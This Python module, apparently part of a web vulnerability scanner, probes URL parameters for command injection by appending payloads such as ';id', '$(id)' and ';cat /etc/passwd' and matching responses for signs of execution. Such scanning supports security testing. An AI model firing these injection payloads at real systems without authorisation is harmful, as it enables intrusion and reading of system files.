import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils.colors import console

CMDI_PAYLOADS = [
    (";id", r"uid=\d+\("),
    ("|id", r"uid=\d+\("),
    ("`id`", r"uid=\d+\("),
    ("$(id)", r"uid=\d+\("),
    (";cat /etc/passwd", r"root:.*:0:0:"),
    ("|whoami", r"(root|www-data|apache|nginx)"),
]

def check_cmdi(requester, url):
    result = {"name": "Command Injection", "findings": [], "vulnerable": []}
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        console.print("[dim]    i No parameters found, skipping[/dim]")
        return result
    console.print(f"[info]  -> Testing {len(params)} param(s) with {len(CMDI_PAYLOADS)} payloads...[/info]")
    for param in params:
        console.print(f"[dim]    -> Param: {param}[/dim]")
        for i, (payload, pattern) in enumerate(CMDI_PAYLOADS, 1):
            q = params.copy()
            q[param] = [params[param][0] + payload]
            test_url = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))
            console.print(f"[dim]      [{i}/{len(CMDI_PAYLOADS)}] {payload!r}[/dim]")
            resp = requester.get(test_url)
            if resp and re.search(pattern, resp.text):
                console.print(f"[vuln]    !! Command Injection via {param}![/vuln]")
                result["vulnerable"].append({"param": param, "payload": payload})
                result["findings"].append({
                    "severity": "critical",
                    "msg": f"Command Injection via param: {param} (payload: {payload})",
                })
                break
    if not result["vulnerable"]:
        console.print("[success]    + No command injection found[/success]")
    return result
